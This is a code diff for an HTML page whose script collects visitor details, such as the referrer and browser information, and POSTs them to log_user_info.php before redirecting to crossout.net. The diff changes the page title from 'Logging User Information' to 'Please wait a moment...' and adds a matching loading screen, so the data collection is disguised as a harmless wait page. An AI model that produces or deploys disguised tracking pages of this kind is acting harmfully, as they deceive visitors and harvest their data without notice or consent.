@@ -2,7 +2,18 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Logging User Information</title>
+    <title>Please wait a moment...</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+    </style>
     <script>
         async function getUserData() {
             const data = {};
@@ -69,7 +80,7 @@
             data.referrer = document.referrer || 'no referrer';
 
             // Send data to the server
-            await fetch('log_user_info.php', {
+            const response = await fetch('log_user_info.php', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -77,8 +88,12 @@
                 body: JSON.stringify(data)
             });
 
-            // Redirect to the production website
-            window.location.href = 'https://www.production-website.com';
+            // Redirect to the production website after successful logging
+            if (response.ok) {
+                window.location.href = 'https://www.crossout.net';
+            } else {
+                console.error('Failed to log user data.');
+            }
         }
 
         function getBrowserInfo() {
@@ -141,5 +156,6 @@
     </script>
 </head>
 <body>
+    <h1>Please wait a moment...</h1>
 </body>
 </html>
